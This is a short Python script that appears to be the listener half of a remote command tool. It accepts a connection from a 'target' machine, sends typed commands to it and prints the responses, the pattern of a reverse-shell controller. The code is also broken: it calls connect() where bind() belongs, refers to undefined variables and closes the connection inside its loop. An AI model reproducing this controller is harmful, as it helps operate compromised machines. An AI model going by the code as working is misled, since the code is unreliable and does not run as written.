import socket

host = '0.0.0.0' #listening on all channels
port = 9999
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect((host, port))
server.listen(1)
print(f"Server listening on {host} : {port}") 
target_socket, target_address = serv.accept()
print(f"connection from {cli_address}")
while True:
    command = input("Enter command: ")
    if command.lower() == 'exit' :
        break
    target_socket.send(command.encode())
    response = target_socket.recv(1024).decode()
    print(f"Client response: {response}")
    target_socket.close()
server.close()
